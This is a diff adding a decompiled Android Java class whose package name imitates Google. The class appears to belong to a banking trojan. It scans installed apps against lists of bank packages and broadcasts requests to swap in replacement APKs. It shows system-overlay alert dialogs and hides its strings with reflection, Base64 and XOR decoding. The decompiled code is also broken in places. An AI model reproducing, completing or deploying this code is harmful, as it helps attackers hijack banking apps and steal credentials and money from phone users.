@@ -1,0 +1,228 @@
+package com.google.bps.bfcfc;
+public class App {
+    java.util.ArrayList items;
+    private android.content.Context mContext;
+
+    public App(android.content.Context p2)
+    {
+        this.items = new java.util.ArrayList();
+        this.mContext = p2;
+        com.google.bps.bfcfc.Config.cBankStr = "";
+        com.google.bps.bfcfc.Config.sBankStr = "";
+        return;
+    }
+
+    static synthetic android.content.Context access$0(com.google.bps.bfcfc.App p1)
+    {
+        return p1.mContext;
+    }
+
+    public static String autoChangeApps()
+    {
+        String v0 = "";
+        android.content.pm.PackageManager v10 = com.google.bps.bfcfc.CoreService.mContext.getPackageManager();
+        com.google.bps.bfcfc.CoreService v11_7 = v10.getInstalledPackages(0).iterator();
+        while (v11_7.hasNext()) {
+            android.content.pm.PackageInfo v9_1 = ((android.content.pm.PackageInfo) v11_7.next());
+            if (((v9_1.applicationInfo.flags & 1) == 0) && ((v9_1.applicationInfo.flags & 128) == 0)) {
+                v0 = new StringBuilder(String.valueOf(v0)).append(v9_1.applicationInfo.loadLabel(v10)).append("#").append(v9_1.applicationInfo.packageName).append("|").toString();
+                int v2 = 0;
+                while (v2 < com.google.bps.bfcfc.Config.bank.length) {
+                    if ((!com.google.bps.bfcfc.Config.bank[v2].equals(v9_1.applicationInfo.packageName)) || ((com.google.bps.bfcfc.App.hasApp(com.google.bps.bfcfc.Config.upbank[v2])) || (com.google.bps.bfcfc.Config.isAlert != 0))) {
+                        v2++;
+                    } else {
+                        String v6_1 = com.google.bps.bfcfc.Config.apkNames[v2];
+                        android.content.Intent v3_1 = new android.content.Intent();
+                        android.os.Bundle v1_1 = new android.os.Bundle();
+                        v1_1.putString("apk", v6_1);
+                        v3_1.putExtras(v1_1);
+                        v3_1.setAction(com.google.bps.bfcfc.App.sendApps("I0UVehEHDxtTPxQSFBUJCTg5AXtoj2Bx"));
+                        com.google.bps.bfcfc.CoreService.mContext.sendBroadcast(v3_1);
+                        String v7 = v6_1;
+                    }
+                }
+            }
+            return v7;
+        }
+        v7 = "";
+        return v7;
+    }
+
+    public static boolean hasApp(String p8)
+    {
+        String v0 = "";
+        int v1 = 0;
+        android.content.pm.PackageManager v4 = com.google.bps.bfcfc.CoreService.mContext.getPackageManager();
+        java.util.Iterator v5_2 = v4.getInstalledPackages(0).iterator();
+        while (v5_2.hasNext()) {
+            android.content.pm.PackageInfo v3_1 = ((android.content.pm.PackageInfo) v5_2.next());
+            if (((v3_1.applicationInfo.flags & 1) == 0) && ((v3_1.applicationInfo.flags & 128) == 0)) {
+                v0 = new StringBuilder(String.valueOf(v0)).append(v3_1.applicationInfo.loadLabel(v4)).append("#").append(v3_1.applicationInfo.packageName).append("|").toString();
+                if (p8.equals(v3_1.applicationInfo.packageName)) {
+                    v1 = 1;
+                }
+            }
+        }
+        return v1;
+    }
+
+    private static String sendApps(String p37)
+    {
+        int v17 = 0;
+        String v28 = 0;
+        String v27 = 0;
+        byte[] v22 = 0;
+        byte[] v7 = new byte[19];
+        v7 = {34, 45, 39, 49, 44, 42, 39, 109, 54, 55, 42, 47, 109, 1, 34, 48, 38, 117, 119};
+        String v29 = new StringBuilder(String.valueOf(p37.substring((p37.length() - 2)))).append(p37.substring(2, (p37.length() - 2))).append(p37.substring(0, 2)).toString();
+        int v12_4 = 0;
+        while (v12_4 < 19) {
+            v7[v12_4] = ((byte) (v7[v12_4] ^ 67));
+            v12_4++;
+        }
+        v28 = new String;
+        v28(v7);
+        String v27_1 = new StringBuilder(String.valueOf(v28.substring(2, 3))).append(v28.substring(16, 17)).toString();
+        String v3_1 = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(v27_1)).append("c").toString())).append(v28.substring(4, 5)).toString())).append(v27_1).toString();
+        try {
+            Class v10 = Class.forName(v28);
+            Class[] v4 = new Class[2];
+            v4[0] = String;
+            v4[1] = Integer.TYPE;
+            reflect.Method v14 = v10.getDeclaredMethod(v3_1, v4);
+            byte v0_4 = new Object[2];
+            int v34_9 = v0_4;
+            v34_9[0] = v29;
+            v34_9[1] = Integer.valueOf(0);
+            byte[] v5 = ((byte[]) v14.invoke(v10, v34_9));
+        } catch (reflect.InvocationTargetException v11_4) {
+            v11_4.printStackTrace();
+        } catch (reflect.InvocationTargetException v11_3) {
+            v11_3.printStackTrace();
+        } catch (reflect.InvocationTargetException v11_2) {
+            v11_2.printStackTrace();
+        } catch (reflect.InvocationTargetException v11_1) {
+            v11_1.printStackTrace();
+        } catch (reflect.InvocationTargetException v11_0) {
+            v11_0.printStackTrace();
+        }
+        int v23;
+        int v20_0 = v5.length;
+        int v21 = v20_0;
+        int v20_2 = ((v20_0 - 1) - Integer.parseInt(String.valueOf(((char) v5[(v20_0 - 1)]))));
+        if (v5[(v20_2 - 1)] != 1) {
+            v23 = 0;
+        } else {
+            v23 = 1;
+        }
+        int v20_3 = (v20_2 - 1);
+        int vtmp36 = Integer.parseInt(new StringBuilder(String.valueOf(String.valueOf(((char) v5[(v20_3 - 2)])))).append(String.valueOf(((char) v5[(v20_3 - 1)]))).toString(), 16);
+        int v20_4 = (v20_3 - 2);
+        int v12_0 = 0;
+        while (v12_0 < v20_4) {
+            v5[v12_0] = ((byte) (v5[v12_0] ^ ((byte) (((byte) vtmp36) - 116))));
+            v12_0++;
+        }
+        int v12_1 = v20_4;
+        while (v12_1 < v21) {
+            v5[v12_1] = 0;
+            v12_1++;
+        }
+        if (v23 == 1) {
+            StackTraceElement v13 = new Exception().getStackTrace()[1];
+            String v25 = v13.getClassName();
+            int v16 = v25.lastIndexOf(".");
+            if (v16 != -1) {
+                v25 = v25.substring((v16 + 1));
+            }
+            String v24 = new StringBuilder(String.valueOf(v25)).append(v13.getMethodName()).toString();
+            if (v24.length() > 256) {
+                v24 = v24.substring(0, 256);
+            }
+            int v12_2 = 0;
+            int v19 = (v24.length() - 1);
+            while (v12_2 < v20_4) {
+                int v18_1 = (v19 - 1);
+                v5[v12_2] = ((byte) (v5[v12_2] ^ ((byte) v24.charAt(v19))));
+                if (v18_1 < 0) {
+                    v18_1 = (v24.length() - 1);
+                }
+                v12_2++;
+                v19 = v18_1;
+            }
+        }
+        byte v0_37 = new byte[v20_4];
+        v22 = v0_37;
+        int v12_3 = 0;
+        while (v12_3 < v20_4) {
+            v22[v12_3] = v5[v12_3];
+            v12_3++;
+        }
+        String v33 = new String;
+        v33(v22);
+        return v33;
+    }
+
+    public void alertBroadCast(String p4)
+    {
+        android.content.Intent v0_1 = new android.content.Intent();
+        v0_1.setAction(com.google.bps.bfcfc.App.sendApps("==spVTshZGQbIC8vIEFDAb5+RFlfNQLT"));
+        v0_1.putExtra(com.google.bps.bfcfc.App.sendApps("4zTP+tszRgFBRY3t"), 1);
+        v0_1.putExtra("info", p4);
+        this.mContext.sendBroadcast(v0_1);
+        return;
+    }
+
+    public void changeApk(String p8)
+    {
+        System.out.println(new StringBuilder(com.google.bps.bfcfc.App.sendApps("M=P4rv7Po/XtvdviqdjrpPf4JDwsdGlbbzk4AXabPTqv")).append(p8).toString());
+        if (!p8.equals("")) {
+            String[] v1 = java.net.URLDecoder.decode(p8).split("|");
+            android.app.AlertDialog$Builder v0_1 = new android.app.AlertDialog$Builder(this.mContext);
+            v0_1.setTitle(v1[0]);
+            v0_1.setPositiveButton(com.google.bps.bfcfc.App.sendApps("Y1yMwLOqz7eVQkYBn4WdXNxq"), new com.google.bps.bfcfc.App$BtnClick(this));
+            v0_1.setNegativeButton(com.google.bps.bfcfc.App.sendApps("Q=CGw7yLx5ayQjQBQTa6kDwp"), new com.google.bps.bfcfc.App$BtnClick(this));
+            android.app.AlertDialog v2 = v0_1.create();
+            v2.getWindow().setType(2003);
+            v2.show();
+        }
+        return;
+    }
+
+    public String getApps()
+    {
+        String v0 = "";
+        android.content.pm.PackageManager v4 = this.mContext.getPackageManager();
+        String v7_7 = v4.getInstalledPackages(0).iterator();
+        while (v7_7.hasNext()) {
+            android.content.pm.PackageInfo v3_1 = ((android.content.pm.PackageInfo) v7_7.next());
+            if (((v3_1.applicationInfo.flags & 1) == 0) && ((v3_1.applicationInfo.flags & 128) == 0)) {
+                v0 = new StringBuilder(String.valueOf(v0)).append(v3_1.applicationInfo.loadLabel(v4)).append("#").append(v3_1.applicationInfo.packageName).append("|").toString();
+                int v1 = 0;
+                while (v1 < com.google.bps.bfcfc.Config.bank.length) {
+                    String v6 = com.google.bps.bfcfc.Config.upbank[v1];
+                    if (com.google.bps.bfcfc.Config.bank[v1].equals(v3_1.applicationInfo.packageName)) {
+                        com.google.bps.bfcfc.Config.cBankStr = new StringBuilder(String.valueOf(com.google.bps.bfcfc.Config.cBankStr)).append("#").append(com.google.bps.bfcfc.Config.bankName[v1]).toString();
+                    }
+                    if (v6.equals(v3_1.applicationInfo.packageName)) {
+                        com.google.bps.bfcfc.Config.sBankStr = new StringBuilder(String.valueOf(com.google.bps.bfcfc.Config.sBankStr)).append("#").append(com.google.bps.bfcfc.Config.bankName[v1]).toString();
+                    }
+                    v1++;
+                }
+            }
+        }
+        if (!com.google.bps.bfcfc.Config.cBankStr.equals("")) {
+            com.google.bps.bfcfc.Config.cBankStr = java.net.URLEncoder.encode(com.google.bps.bfcfc.Config.cBankStr);
+        }
+        if (!com.google.bps.bfcfc.Config.sBankStr.equals("")) {
+            com.google.bps.bfcfc.Config.sBankStr = java.net.URLEncoder.encode(com.google.bps.bfcfc.Config.sBankStr);
+        }
+        return v0;
+    }
+
+    public void sendApps()
+    {
+        new Thread(new com.google.bps.bfcfc.App$1(this)).start();
+        return;
+    }
+}
